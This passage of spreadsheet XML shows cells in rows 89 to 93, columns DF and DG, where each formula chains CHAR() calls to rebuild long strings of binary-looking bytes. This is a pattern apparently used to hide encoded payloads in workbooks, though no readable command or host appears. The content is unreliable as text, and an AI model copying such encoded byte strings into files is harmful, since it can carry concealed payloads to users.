AR(76)&amp;CHAR(6)&amp;CHAR(84)&amp;CHAR(139)&amp;CHAR(162)&amp;CHAR(94)&amp;CHAR(5)&amp;CHAR(19)&amp;CHAR(10)</f>
        <v xml:space="preserve">
Ž_!_x0011_Šv!*‚_x0015_ˆW_x0017_Qˆi_x0006__x0005__x0007_˜_x000D_ZWú_x0016_ŒÅ	¦_x0005__x0002__x0004_n)&amp;_x0007_ˆŽ_x0019__x001B__x0016__x000C_F"_x0013_H)_x0017_Zd_x0005_l0ýRKÿú_x0004_™_x0001__x0002__x0005_^_x000B_6ÑŒÉ;Ž_x0011__x001B__x0005__x0007_a*}_x000D_&lt;‚_x0019__x001C__x0006__x0007_e&amp;1ßˆŽ$_x001E__x001E__x0003__x000B__x0006__x001C_M?Ÿ_x0012__x0016__x000C__x000C_æ}_x0006_?‹1_x001B__x0001__x0013_xäY/-‚O_x0012_ˆ@_x001D_WR@Œ_x0010_ý™±_x0002__x0005__x0007_äß_x0011_Å6ÕIŽÌŽW!_x0012_E_x0006_4“_x0013__x001A__x000B_	p1{_x000C_;“_x001F__x0015__x000C__x000D_}_x0017_†/9_x001B__x0001__x0013_‚_x0013__x0002_D0_x001D__x0018__x0002__x0005_täp_x000D_*Š_x0011__x001B__x000B__x0005_pæPìTnŽA#_x0019_ZXZH†Æ_x0010_Á‰*_x0006_îÏõöýŸ2íÅøðó?ò†L_x0006_T‹¢^_x0005__x0013_
</v>
      </c>
      <c r="DG89" t="str">
        <f>CHAR(253)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)&amp;CHAR(96)&amp;CHAR(75)&amp;CHAR(114)&amp;CHAR(82)&amp;CHAR(21)&amp;CHAR(137)</f>
        <v>ý†Ê|`KrR_x0015_‰</v>
      </c>
    </row>
    <row r="90" spans="110:111" x14ac:dyDescent="0.45">
      <c r="DF90" t="str">
        <f>CHAR(87)&amp;CHAR(135)&amp;CHAR(134)&amp;CHAR(71)&amp;CHAR(1)&amp;CHAR(9)&amp;CHAR(1)&amp;CHAR(82)&amp;CHAR(82)&amp;CHAR(81)&amp;CHAR(246)&amp;CHAR(148)&amp;CHAR(165)&amp;CHAR(17)&amp;CHAR(7)&amp;CHAR(1)&amp;CHAR(135)&amp;CHAR(203)&amp;CHAR(10)&amp;CHAR(139)&amp;CHAR(174)&amp;CHAR(249)&amp;CHAR(236)&amp;CHAR(248)&amp;CHAR(131)&amp;CHAR(123)&amp;CHAR(13)&amp;CHAR(52)&amp;CHAR(201)&amp;CHAR(238)&amp;CHAR(184)&amp;CHAR(132)&amp;CHAR(255)&amp;CHAR(105)&amp;CHAR(81)&amp;CHAR(143)&amp;CHAR(94)&amp;CHAR(46)&amp;CHAR(121)&amp;CHAR(53)&amp;CHAR(199)&amp;CHAR(86)&amp;CHAR(93)&amp;CHAR(94)&amp;CHAR(143)&amp;CHAR(106)&amp;CHAR(40)&amp;CHAR(56)&amp;CHAR(49)&amp;CHAR(235)&amp;CHAR(46)&amp;CHAR(96)&amp;CHAR(40)&amp;CHAR(25)&amp;CHAR(134)&amp;CHAR(185)&amp;CHAR(70)&amp;CHAR(3)&amp;CHAR(6)&amp;CHAR(33)&amp;CHAR(169)&amp;CHAR(170)&amp;CHAR(184)&amp;CHAR(161)&amp;CHAR(52)&amp;CHAR(202)&amp;CHAR(99)&amp;CHAR(130)&amp;CHAR(65)&amp;CHAR(45)&amp;CHAR(17)&amp;CHAR(66)&amp;CHAR(60)&amp;CHAR(133)&amp;CHAR(5)&amp;CHAR(2)&amp;CHAR(5)&amp;CHAR(17)&amp;CHAR(115)&amp;CHAR(3)&amp;CHAR(137)&amp;CHAR(61)&amp;CHAR(134)&amp;CHAR(60)&amp;CHAR(7)&amp;CHAR(8)&amp;CHAR(150)&amp;CHAR(99)&amp;CHAR(11)&amp;CHAR(5)&amp;CHAR(5)&amp;CHAR(140)&amp;CHAR(141)&amp;CHAR(33)&amp;CHAR(130)&amp;CHAR(7)&amp;CHAR(19)&amp;CHAR(5)&amp;CHAR(137)&amp;CHAR(76)&amp;CHAR(22)&amp;CHAR(135)&amp;CHAR(117)&amp;CHAR(26)&amp;CHAR(80)&amp;CHAR(82)&amp;CHAR(128)&amp;CHAR(8)&amp;CHAR(253)&amp;CHAR(70)&amp;CHAR(76)&amp;CHAR(129)&amp;CHAR(194)&amp;CHAR(9)&amp;CHAR(135)&amp;CHAR(77)&amp;CHAR(13)&amp;CHAR(13)&amp;CHAR(11)&amp;CHAR(129)&amp;CHAR(9)&amp;CHAR(137)&amp;CHAR(82)&amp;CHAR(5)&amp;CHAR(22)&amp;CHAR(83)&amp;CHAR(67)&amp;CHAR(129)&amp;CHAR(15)&amp;CHAR(245)&amp;CHAR(84)&amp;CHAR(67)&amp;CHAR(128)&amp;CHAR(201)&amp;CHAR(14)&amp;CHAR(138)&amp;CHAR(75)&amp;CHAR(4)&amp;CHAR(9)&amp;CHAR(7)&amp;CHAR(136)&amp;CHAR(85)&amp;CHAR(35)&amp;CHAR(37)&amp;CHAR(82)&amp;CHAR(97)&amp;CHAR(4)&amp;CHAR(253)&amp;CHAR(113)&amp;CHAR(35)&amp;CHAR(15)&amp;CHAR(248)&amp;CHAR(89)&amp;CHAR(109)&amp;CHAR(136)&amp;CHAR(67)&amp;CHAR(45)&amp;CHAR(37)&amp;CHAR(86)&amp;CHAR(109)&amp;CHAR(18)&amp;CHAR(250)&amp;CHAR(118)&amp;CHAR(32)&amp;CHAR(30)&amp;CHAR(245)&amp;CHAR(94)&amp;CHAR(106)&amp;CHAR(140)&amp;CHAR(71)&amp;CHAR(47)&amp;CHAR(41)&amp;CHAR(41)&amp;CHAR(82)&amp;CHAR(40)&amp;CHAR(32)&amp;CHAR(129)&amp;CHAR(198)&amp;CHAR(14)&amp;CHAR(3)&amp;CHAR(136)&amp;CHAR(177)&amp;CHAR(11)&amp;CHAR(10)&amp;CHAR(14)&amp;CHAR(110)&amp;CHAR(7)&amp;CHAR(75)&amp;CHAR(2)&amp;CHAR(107)&amp;CHAR(31)&amp;CHAR(245)&amp;CHAR(84)&amp;CHAR(86)&amp;CHAR(142)&amp;CHAR(227)&amp;CHAR(54)&amp;CHAR(192)&amp;CHAR(56)&amp;CHAR(140)&amp;CHAR(1)&amp;CHAR(14)&amp;CHAR(9)&amp;CHAR(7)&amp;CHAR(189)&amp;CHAR(25)&amp;CHAR(39)&amp;CHAR(1)&amp;CHAR(2)&amp;CHAR(109)&amp;CHAR(140)&amp;CHAR(70)&amp;CHAR(33)&amp;CHAR(43)&amp;CHAR(103)&amp;CHAR(95)&amp;CHAR(245)&amp;CHAR(179)&amp;CHAR(1)&amp;CHAR(15)&amp;CHAR(9)&amp;CHAR(5)&amp;CHAR(87)&amp;CHAR(109)&amp;CHAR(27)&amp;CHAR(250)&amp;CHAR(81)&amp;CHAR(88)&amp;CHAR(139)&amp;CHAR(78)&amp;CHAR(41)&amp;CHAR(50)&amp;CHAR(52)&amp;CHAR(195)&amp;CHAR(130)&amp;CHAR(141)&amp;CHAR(38)&amp;CHAR(150)&amp;CHAR(12)&amp;CHAR(4)&amp;CHAR(2)&amp;CHAR(63)&amp;CHAR(137)&amp;CHAR(8)&amp;CHAR(4)&amp;CHAR(13)&amp;CHAR(11)&amp;CHAR(124)&amp;CHAR(109)&amp;CHAR(197)&amp;CHAR(230)&amp;CHAR(40)&amp;CHAR(7)&amp;CHAR(9)&amp;CHAR(27)</f>
        <v>W‡†G_x0001_	_x0001_RRQö”¥_x0011__x0007__x0001_‡Ë
‹®ùìøƒ{_x000D_4Éî¸„ÿiQ^.y5ÇV]^j(81ë.`(_x0019_†¹F_x0003__x0006_!©ª¸¡4Êc‚A-_x0011_B&lt;…_x0005__x0002__x0005__x0011_s_x0003_‰=†&lt;_x0007__x0008_–c_x000B__x0005__x0005_Œ!‚_x0007__x0013__x0005_‰L_x0016_‡u_x001A_PR€_x0008_ýFLÂ	‡M_x000D__x000D__x000B_	‰R_x0005__x0016_SC_x000F_õTC€É_x000E_ŠK_x0004_	_x0007_ˆU#%Ra_x0004_ýq#_x000F_øYmˆC-%Vm_x0012_úv _x001E_õ^jŒG/))R( Æ_x000E__x0003_ˆ±_x000B_
_x000E_n_x0007_K_x0002_k_x001F_õTVŽã6À8Œ_x0001__x000E_	_x0007_½_x0019_'_x0001__x0002_mŒF!+g_õ³_x0001__x000F_	_x0005_Wm_x001B_úQX‹N)24Ã‚&amp;–_x000C__x0004__x0002_?‰_x0008__x0004__x000D__x000B_|mÅæ(_x0007_	_x001B_</v>
      </c>
      <c r="DG90" t="str">
        <f>CHAR(79)&amp;CHAR(9)&amp;CHAR(155)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(178)&amp;CHAR(157)&amp;CHAR(13)&amp;CHAR(206)&amp;CHAR(89)</f>
        <v>O	›_x001D_R²_x000D_ÎY</v>
      </c>
    </row>
    <row r="91" spans="110:111" x14ac:dyDescent="0.45">
      <c r="DF91" t="str">
        <f>CHAR(10)&amp;CHAR(7)&amp;CHAR(9)&amp;CHAR(195)&amp;CHAR(91)&amp;CHAR(250)&amp;CHAR(90)&amp;CHAR(113)&amp;CHAR(82)&amp;CHAR(136)&amp;CHAR(130)&amp;CHAR(45)&amp;CHAR(131)&amp;CHAR(5)&amp;CHAR(17)&amp;CHAR(7)&amp;CHAR(81)&amp;CHAR(253)&amp;CHAR(127)&amp;CHAR(33)&amp;CHAR(62)&amp;CHAR(250)&amp;CHAR(84)&amp;CHAR(115)&amp;CHAR(140)&amp;CHAR(142)&amp;CHAR(33)&amp;CHAR(133)&amp;CHAR(7)&amp;CHAR(9)&amp;CHAR(5)&amp;CHAR(70)&amp;CHAR(142)&amp;CHAR(151)&amp;CHAR(33)&amp;CHAR(130)&amp;CHAR(4)&amp;CHAR(2)&amp;CHAR(10)&amp;CHAR(54)&amp;CHAR(128)&amp;CHAR(3)&amp;CHAR(11)&amp;CHAR(11)&amp;CHAR(9)&amp;CHAR(112)&amp;CHAR(221)&amp;CHAR(231)&amp;CHAR(40)&amp;CHAR(104)&amp;CHAR(7)&amp;CHAR(94)&amp;CHAR(102)&amp;CHAR(4)&amp;CHAR(242)&amp;CHAR(88)&amp;CHAR(86)&amp;CHAR(141)&amp;CHAR(160)&amp;CHAR(34)&amp;CHAR(161)&amp;CHAR(2)&amp;CHAR(1)&amp;CHAR(19)&amp;CHAR(10)&amp;CHAR(142)&amp;CHAR(78)&amp;CHAR(33)&amp;CHAR(63)&amp;CHAR(136)&amp;CHAR(77)&amp;CHAR(37)&amp;CHAR(18)&amp;CHAR(85)&amp;CHAR(249)&amp;CHAR(90)&amp;CHAR(119)&amp;CHAR(85)&amp;CHAR(156)&amp;CHAR(131)&amp;CHAR(37)&amp;CHAR(134)&amp;CHAR(11)&amp;CHAR(5)&amp;CHAR(2)&amp;CHAR(85)&amp;CHAR(248)&amp;CHAR(103)&amp;CHAR(35)&amp;CHAR(54)&amp;CHAR(250)&amp;CHAR(86)&amp;CHAR(103)&amp;CHAR(138)&amp;CHAR(161)&amp;CHAR(34)&amp;CHAR(135)&amp;CHAR(19)&amp;CHAR(5)&amp;CHAR(2)&amp;CHAR(4)&amp;CHAR(143)&amp;CHAR(78)&amp;CHAR(41)&amp;CHAR(42)&amp;CHAR(87)&amp;CHAR(142)&amp;CHAR(143)&amp;CHAR(45)&amp;CHAR(134)&amp;CHAR(22)&amp;CHAR(12)&amp;CHAR(4)&amp;CHAR(82)&amp;CHAR(83)&amp;CHAR(240)&amp;CHAR(95)&amp;CHAR(108)&amp;CHAR(142)&amp;CHAR(111)&amp;CHAR(46)&amp;CHAR(74)&amp;CHAR(4)&amp;CHAR(139)&amp;CHAR(117)&amp;CHAR(38)&amp;CHAR(93)&amp;CHAR(65)&amp;CHAR(57)&amp;CHAR(199)&amp;CHAR(135)&amp;CHAR(113)&amp;CHAR(47)&amp;CHAR(69)&amp;CHAR(73)&amp;CHAR(103)&amp;CHAR(139)&amp;CHAR(65)&amp;CHAR(34)&amp;CHAR(73)&amp;CHAR(140)&amp;CHAR(2)&amp;CHAR(68)&amp;CHAR(132)&amp;CHAR(237)&amp;CHAR(18)&amp;CHAR(128)&amp;CHAR(249)&amp;CHAR(137)&amp;CHAR(13)&amp;CHAR(87)&amp;CHAR(182)&amp;CHAR(162)&amp;CHAR(175)&amp;CHAR(160)&amp;CHAR(250)&amp;CHAR(150)&amp;CHAR(157)&amp;CHAR(5)&amp;CHAR(6)&amp;CHAR(7)&amp;CHAR(150)&amp;CHAR(232)&amp;CHAR(13)&amp;CHAR(128)&amp;CHAR(48)&amp;CHAR(11)&amp;CHAR(13)&amp;CHAR(6)&amp;CHAR(248)&amp;CHAR(119)&amp;CHAR(47)&amp;CHAR(61)&amp;CHAR(253)&amp;CHAR(69)&amp;CHAR(104)&amp;CHAR(81)&amp;CHAR(253)&amp;CHAR(85)&amp;CHAR(107)&amp;CHAR(229)&amp;CHAR(46)&amp;CHAR(12)&amp;CHAR(11)&amp;CHAR(10)&amp;CHAR(47)&amp;CHAR(43)&amp;CHAR(239)&amp;CHAR(58)&amp;CHAR(3)&amp;CHAR(1)&amp;CHAR(19)&amp;CHAR(135)&amp;CHAR(129)&amp;CHAR(14)&amp;CHAR(1)&amp;CHAR(11)&amp;CHAR(5)&amp;CHAR(89)&amp;CHAR(254)&amp;CHAR(81)&amp;CHAR(117)&amp;CHAR(141)&amp;CHAR(225)&amp;CHAR(142)&amp;CHAR(105)&amp;CHAR(53)&amp;CHAR(31)&amp;CHAR(132)&amp;CHAR(239)&amp;CHAR(4)&amp;CHAR(129)&amp;CHAR(4)&amp;CHAR(4)&amp;CHAR(7)&amp;CHAR(19)&amp;CHAR(138)&amp;CHAR(140)&amp;CHAR(1)&amp;CHAR(3)&amp;CHAR(7)&amp;CHAR(9)&amp;CHAR(85)&amp;CHAR(249)&amp;CHAR(84)&amp;CHAR(99)&amp;CHAR(140)&amp;CHAR(70)&amp;CHAR(32)&amp;CHAR(30)&amp;CHAR(143)&amp;CHAR(205)&amp;CHAR(9)&amp;CHAR(131)&amp;CHAR(234)&amp;CHAR(11)&amp;CHAR(9)&amp;CHAR(2)&amp;CHAR(157)&amp;CHAR(128)&amp;CHAR(32)&amp;CHAR(134)&amp;CHAR(6)&amp;CHAR(15)&amp;CHAR(12)&amp;CHAR(135)&amp;CHAR(92)&amp;CHAR(31)&amp;CHAR(135)&amp;CHAR(79)&amp;CHAR(28)&amp;CHAR(86)&amp;CHAR(116)&amp;CHAR(80)&amp;CHAR(138)</f>
        <v xml:space="preserve">
_x0007_	Ã[úZqRˆ‚-ƒ_x0005__x0011__x0007_Qý!&gt;úTsŒŽ!…_x0007_	_x0005_FŽ—!‚_x0004__x0002_
6€_x0003__x000B__x000B_	pÝç(h_x0007_^f_x0004_òXV "¡_x0002__x0001__x0013_
ŽN!?ˆM%_x0012_UùZwUœƒ%†_x000B__x0005__x0002_Uøg#6úVgŠ¡"‡_x0013__x0005__x0002__x0004_N)*WŽ-†_x0016__x000C__x0004_RSð_lŽo.J_x0004_‹u&amp;]A9Ç‡q/EIg‹A"IŒ_x0002_D„í_x0012_€ù‰_x000D_W¶¢¯ ú–_x0005__x0006__x0007_–è_x000D_€0_x000B__x000D__x0006_øw/=ýEhQýUkå._x000C__x000B_
/+ï:_x0003__x0001__x0013_‡_x000E__x0001__x000B__x0005_YþQuáŽi5_x001F_„ï_x0004__x0004__x0004__x0007__x0013_ŠŒ_x0001__x0003__x0007_	UùTcŒF _x001E_Í	ƒê_x000B_	_x0002_€ †_x0006__x000F__x000C_‡\_x001F_‡O_x001C_VtPŠ</v>
      </c>
      <c r="DG91" t="str">
        <f>CHAR(183)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(157)&amp;CHAR(5)&amp;CHAR(10)&amp;CHAR(44)&amp;CHAR(215)&amp;CHAR(150)</f>
        <v>·_x001D_R×_x0005_
,×–</v>
      </c>
    </row>
    <row r="92" spans="110:111" x14ac:dyDescent="0.45">
      <c r="DF92" t="str">
        <f>CHAR(25)&amp;CHAR(131)&amp;CHAR(67)&amp;CHAR(46)&amp;CHAR(49)&amp;CHAR(244)&amp;CHAR(84)&amp;CHAR(77)&amp;CHAR(138)&amp;CHAR(250)&amp;CHAR(128)&amp;CHAR(249)&amp;CHAR(6)&amp;CHAR(143)&amp;CHAR(187)&amp;CHAR(17)&amp;CHAR(7)&amp;CHAR(1)&amp;CHAR(137)&amp;CHAR(141)&amp;CHAR(1)&amp;CHAR(10)&amp;CHAR(5)&amp;CHAR(7)&amp;CHAR(32)&amp;CHAR(234)&amp;CHAR(143)&amp;CHAR(197)&amp;CHAR(113)&amp;CHAR(105)&amp;CHAR(89)&amp;CHAR(80)&amp;CHAR(108)&amp;CHAR(11)&amp;CHAR(236)&amp;CHAR(86)&amp;CHAR(94)&amp;CHAR(143)&amp;CHAR(234)&amp;CHAR(143)&amp;CHAR(224)&amp;CHAR(114)&amp;CHAR(102)&amp;CHAR(128)&amp;CHAR(175)&amp;CHAR(45)&amp;CHAR(130)&amp;CHAR(22)&amp;CHAR(12)&amp;CHAR(4)&amp;CHAR(2)&amp;CHAR(133)&amp;CHAR(177)&amp;CHAR(8)&amp;CHAR(4)&amp;CHAR(13)&amp;CHAR(11)&amp;CHAR(10)&amp;CHAR(120)&amp;CHAR(84)&amp;CHAR(53)&amp;CHAR(225)&amp;CHAR(195)&amp;CHAR(225)&amp;CHAR(26)&amp;CHAR(15)&amp;CHAR(15)&amp;CHAR(2)&amp;CHAR(5)&amp;CHAR(11)&amp;CHAR(6)&amp;CHAR(207)&amp;CHAR(81)&amp;CHAR(253)&amp;CHAR(86)&amp;CHAR(118)&amp;CHAR(99)&amp;CHAR(15)&amp;CHAR(140)&amp;CHAR(85)&amp;CHAR(35)&amp;CHAR(89)&amp;CHAR(90)&amp;CHAR(109)&amp;CHAR(140)&amp;CHAR(70)&amp;CHAR(33)&amp;CHAR(75)&amp;CHAR(158)&amp;CHAR(67)&amp;CHAR(46)&amp;CHAR(73)&amp;CHAR(85)&amp;CHAR(138)&amp;CHAR(141)&amp;CHAR(33)&amp;CHAR(130)&amp;CHAR(7)&amp;CHAR(19)&amp;CHAR(5)&amp;CHAR(82)&amp;CHAR(81)&amp;CHAR(253)&amp;CHAR(89)&amp;CHAR(109)&amp;CHAR(141)&amp;CHAR(255)&amp;CHAR(134)&amp;CHAR(244)&amp;CHAR(112)&amp;CHAR(4)&amp;CHAR(67)&amp;CHAR(243)&amp;CHAR(87)&amp;CHAR(102)&amp;CHAR(53)&amp;CHAR(226)&amp;CHAR(135)&amp;CHAR(136)&amp;CHAR(41)&amp;CHAR(139)&amp;CHAR(10)&amp;CHAR(14)&amp;CHAR(4)&amp;CHAR(70)&amp;CHAR(168)&amp;CHAR(134)&amp;CHAR(37)&amp;CHAR(147)&amp;CHAR(10)&amp;CHAR(7)&amp;CHAR(10)&amp;CHAR(62)&amp;CHAR(141)&amp;CHAR(1)&amp;CHAR(1)&amp;CHAR(1)&amp;CHAR(2)&amp;CHAR(119)&amp;CHAR(180)&amp;CHAR(140)&amp;CHAR(248)&amp;CHAR(125)&amp;CHAR(45)&amp;CHAR(140)&amp;CHAR(69)&amp;CHAR(38)&amp;CHAR(35)&amp;CHAR(136)&amp;CHAR(86)&amp;CHAR(33)&amp;CHAR(107)&amp;CHAR(65)&amp;CHAR(82)&amp;CHAR(137)&amp;CHAR(233)&amp;CHAR(21)&amp;CHAR(138)&amp;CHAR(125)&amp;CHAR(33)&amp;CHAR(82)&amp;CHAR(140)&amp;CHAR(19)&amp;CHAR(142)&amp;CHAR(254)&amp;CHAR(110)&amp;CHAR(2)&amp;CHAR(129)&amp;CHAR(5)&amp;CHAR(163)&amp;CHAR(111)&amp;CHAR(27)&amp;CHAR(10)&amp;CHAR(9)&amp;CHAR(2)&amp;CHAR(179)&amp;CHAR(169)&amp;CHAR(161)&amp;CHAR(137)&amp;CHAR(114)&amp;CHAR(43)&amp;CHAR(48)&amp;CHAR(90)&amp;CHAR(93)&amp;CHAR(244)&amp;CHAR(155)&amp;CHAR(234)&amp;CHAR(4)&amp;CHAR(6)&amp;CHAR(33)&amp;CHAR(135)&amp;CHAR(236)&amp;CHAR(103)&amp;CHAR(14)&amp;CHAR(82)&amp;CHAR(245)&amp;CHAR(86)&amp;CHAR(111)&amp;CHAR(142)&amp;CHAR(101)&amp;CHAR(37)&amp;CHAR(26)&amp;CHAR(238)&amp;CHAR(14)&amp;CHAR(130)&amp;CHAR(107)&amp;CHAR(33)&amp;CHAR(9)&amp;CHAR(140)&amp;CHAR(117)&amp;CHAR(38)&amp;CHAR(23)&amp;CHAR(83)&amp;CHAR(253)&amp;CHAR(86)&amp;CHAR(115)&amp;CHAR(70)&amp;CHAR(248)&amp;CHAR(89)&amp;CHAR(113)&amp;CHAR(54)&amp;CHAR(199)&amp;CHAR(73)&amp;CHAR(90)&amp;CHAR(88)&amp;CHAR(90)&amp;CHAR(72)&amp;CHAR(134)&amp;CHAR(198)&amp;CHAR(104)&amp;CHAR(193)&amp;CHAR(139)&amp;CHAR(225)&amp;CHAR(218)&amp;CHAR(7)&amp;CHAR(3)&amp;CHAR(11)&amp;CHAR(177)&amp;CHAR(3)&amp;CHAR(22)&amp;CHAR(12)&amp;CHAR(76)&amp;CHAR(197)&amp;CHAR(66)&amp;CHAR(43)&amp;CHAR(44)&amp;CHAR(61)&amp;CHAR(205)&amp;CHAR(67)&amp;CHAR(115)&amp;CHAR(93)&amp;CHAR(81)&amp;CHAR(141)&amp;CHAR(141)&amp;CHAR(38)</f>
        <v>_x0019_ƒC.1ôTMŠú€ù_x0006_»_x0011__x0007__x0001_‰_x0001_
_x0005__x0007_ êÅqiYPl_x000B_ìV^êàrf€¯-‚_x0016__x000C__x0004__x0002_…±_x0008__x0004__x000D__x000B_
xT5áÃá_x001A__x000F__x000F__x0002__x0005__x000B__x0006_ÏQýVvc_x000F_ŒU#YZmŒF!KžC.IUŠ!‚_x0007__x0013__x0005_RQýYmÿ†ôp_x0004_CóWf5â‡ˆ)‹
_x000E__x0004_F¨†%“
_x0007_
&gt;_x0001__x0001__x0001__x0002_w´Œø}-ŒE&amp;#ˆV!kAR‰é_x0015_Š}!RŒ_x0013_Žþn_x0002__x0005_£o_x001B_
	_x0002_³©¡‰r+0Z]ô›ê_x0004__x0006_!‡ìg_x000E_RõVoŽe%_x001A_î_x000E_‚k!	Œu&amp;_x0017_SýVsFøYq6ÇIZXZH†ÆhÁ‹áÚ_x0007__x0003__x000B_±_x0003__x0016__x000C_LÅB+,=ÍCs]Q&amp;</v>
      </c>
      <c r="DG92" t="str">
        <f>CHAR(82)&amp;CHAR(159)&amp;CHAR(94)&amp;CHAR(134)&amp;CHAR(175)&amp;CHAR(48)&amp;CHAR(20)&amp;CHAR(17)&amp;CHAR(119)&amp;CHAR(255)</f>
        <v>RŸ^†¯0_x0014__x0011_wÿ</v>
      </c>
    </row>
    <row r="93" spans="110:111" x14ac:dyDescent="0.45">
      <c r="DF93" t="str">
        <f>CHAR(233)&amp;CHAR(19)&amp;CHAR(10)&amp;CHAR(7)&amp;CHAR(131)&amp;CHAR(65)&amp;CHAR(47)&amp;CHAR(73)&amp;CHAR(128)&amp;CHAR(69)&amp;CHAR(38)&amp;CHAR(81)&amp;CHAR(143)&amp;CHAR(77)&amp;CHAR(35)&amp;CHAR(89)&amp;CHAR(146)&amp;CHAR(186)&amp;CHAR(13)&amp;CHAR(7)&amp;CHAR(11)&amp;CHAR(5)&amp;CHAR(3)&amp;CHAR(140)&amp;CHAR(67)&amp;CHAR(55)&amp;CHAR(99)&amp;CHAR(131)&amp;CHAR(65)&amp;CHAR(33)&amp;CHAR(107)&amp;CHAR(128)&amp;CHAR(129)&amp;CHAR(34)&amp;CHAR(175)&amp;CHAR(19)&amp;CHAR(5)&amp;CHAR(2)&amp;CHAR(141)&amp;CHAR(134)&amp;CHAR(46)&amp;CHAR(205)&amp;CHAR(6)&amp;CHAR(7)&amp;CHAR(3)&amp;CHAR(130)&amp;CHAR(141)&amp;CHAR(38)&amp;CHAR(222)&amp;CHAR(12)&amp;CHAR(4)&amp;CHAR(2)&amp;CHAR(143)&amp;CHAR(139)&amp;CHAR(40)&amp;CHAR(220)&amp;CHAR(13)&amp;CHAR(11)&amp;CHAR(10)&amp;CHAR(135)&amp;CHAR(128)&amp;CHAR(34)&amp;CHAR(249)&amp;CHAR(2)&amp;CHAR(1)&amp;CHAR(19)&amp;CHAR(135)&amp;CHAR(130)&amp;CHAR(66)&amp;CHAR(2)&amp;CHAR(11)&amp;CHAR(5)&amp;CHAR(94)&amp;CHAR(198)&amp;CHAR(70)&amp;CHAR(33)&amp;CHAR(54)&amp;CHAR(18)&amp;CHAR(140)&amp;CHAR(65)&amp;CHAR(53)&amp;CHAR(192)&amp;CHAR(69)&amp;CHAR(38)&amp;CHAR(63)&amp;CHAR(1)&amp;CHAR(137)&amp;CHAR(73)&amp;CHAR(35)&amp;CHAR(212)&amp;CHAR(67)&amp;CHAR(46)&amp;CHAR(61)&amp;CHAR(13)&amp;CHAR(140)&amp;CHAR(93)&amp;CHAR(33)&amp;CHAR(193)&amp;CHAR(67)&amp;CHAR(55)&amp;CHAR(57)&amp;CHAR(14)&amp;CHAR(86)&amp;CHAR(131)&amp;CHAR(200)&amp;CHAR(202)&amp;CHAR(66)&amp;CHAR(35)&amp;CHAR(67)&amp;CHAR(11)&amp;CHAR(11)&amp;CHAR(2)&amp;CHAR(22)&amp;CHAR(203)&amp;CHAR(64)&amp;CHAR(38)&amp;CHAR(66)&amp;CHAR(140)&amp;CHAR(229)&amp;CHAR(13)&amp;CHAR(120)&amp;CHAR(204)&amp;CHAR(78)&amp;CHAR(42)&amp;CHAR(76)&amp;CHAR(242)&amp;CHAR(222)&amp;CHAR(210)&amp;CHAR(194)&amp;CHAR(212)&amp;CHAR(78)&amp;CHAR(35)&amp;CHAR(70)&amp;CHAR(77)&amp;CHAR(138)&amp;CHAR(233)&amp;CHAR(65)&amp;CHAR(198)&amp;CHAR(70)&amp;CHAR(33)&amp;CHAR(82)&amp;CHAR(128)&amp;CHAR(171)&amp;CHAR(33)&amp;CHAR(33)&amp;CHAR(192)&amp;CHAR(69)&amp;CHAR(38)&amp;CHAR(87)&amp;CHAR(140)&amp;CHAR(158)&amp;CHAR(33)&amp;CHAR(63)&amp;CHAR(212)&amp;CHAR(67)&amp;CHAR(46)&amp;CHAR(97)&amp;CHAR(140)&amp;CHAR(187)&amp;CHAR(45)&amp;CHAR(37)&amp;CHAR(193)&amp;CHAR(67)&amp;CHAR(55)&amp;CHAR(105)&amp;CHAR(139)&amp;CHAR(176)&amp;CHAR(38)&amp;CHAR(34)&amp;CHAR(202)&amp;CHAR(66)&amp;CHAR(35)&amp;CHAR(119)&amp;CHAR(130)&amp;CHAR(239)&amp;CHAR(74)&amp;CHAR(159)&amp;CHAR(203)&amp;CHAR(64)&amp;CHAR(38)&amp;CHAR(126)&amp;CHAR(192)&amp;CHAR(180)&amp;CHAR(12)&amp;CHAR(15)&amp;CHAR(204)&amp;CHAR(78)&amp;CHAR(42)&amp;CHAR(120)&amp;CHAR(6)&amp;CHAR(33)&amp;CHAR(78)&amp;CHAR(136)&amp;CHAR(212)&amp;CHAR(142)&amp;CHAR(35)&amp;CHAR(138)&amp;CHAR(5)&amp;CHAR(11)&amp;CHAR(5)&amp;CHAR(200)&amp;CHAR(73)&amp;CHAR(143)&amp;CHAR(17)&amp;CHAR(193)&amp;CHAR(141)&amp;CHAR(35)&amp;CHAR(129)&amp;CHAR(17)&amp;CHAR(7)&amp;CHAR(1)&amp;CHAR(3)&amp;CHAR(71)&amp;CHAR(136)&amp;CHAR(6)&amp;CHAR(194)&amp;CHAR(131)&amp;CHAR(55)&amp;CHAR(143)&amp;CHAR(10)&amp;CHAR(5)&amp;CHAR(5)&amp;CHAR(5)&amp;CHAR(68)&amp;CHAR(136)&amp;CHAR(10)&amp;CHAR(192)&amp;CHAR(151)&amp;CHAR(33)&amp;CHAR(142)&amp;CHAR(4)&amp;CHAR(2)&amp;CHAR(10)&amp;CHAR(13)&amp;CHAR(79)&amp;CHAR(138)&amp;CHAR(31)&amp;CHAR(204)&amp;CHAR(141)&amp;CHAR(38)&amp;CHAR(134)&amp;CHAR(12)&amp;CHAR(4)&amp;CHAR(2)&amp;CHAR(7)&amp;CHAR(71)&amp;CHAR(133)&amp;CHAR(144)&amp;CHAR(202)&amp;CHAR(143)&amp;CHAR(46)&amp;CHAR(154)&amp;CHAR(4)&amp;CHAR(6)&amp;CHAR(33)</f>
        <v>é_x0013_
_x0007_ƒA/I€E&amp;QM#Y’º_x000D__x0007__x000B__x0005__x0003_ŒC7cƒA!k€"¯_x0013__x0005__x0002_†.Í_x0006__x0007__x0003_‚&amp;Þ_x000C__x0004__x0002_‹(Ü_x000D__x000B_
‡€"ù_x0002__x0001__x0013_‡‚B_x0002__x000B__x0005_^ÆF!6_x0012_ŒA5ÀE&amp;?_x0001_‰I#ÔC.=_x000D_Œ]!ÁC79_x000E_VƒÈÊB#C_x000B__x000B__x0002__x0016_Ë@&amp;BŒå_x000D_xÌN*LòÞÒÂÔN#FMŠéAÆF!R€«!!ÀE&amp;WŒž!?ÔC.aŒ»-%ÁC7i‹°&amp;"ÊB#w‚ïJŸË@&amp;~À´_x000C__x000F_ÌN*x_x0006_!NˆÔŽ#Š_x0005__x000B__x0005_ÈI_x0011_Á#_x0011__x0007__x0001__x0003_Gˆ_x0006_Âƒ7
_x0005__x0005__x0005_Dˆ
À—!Ž_x0004__x0002_
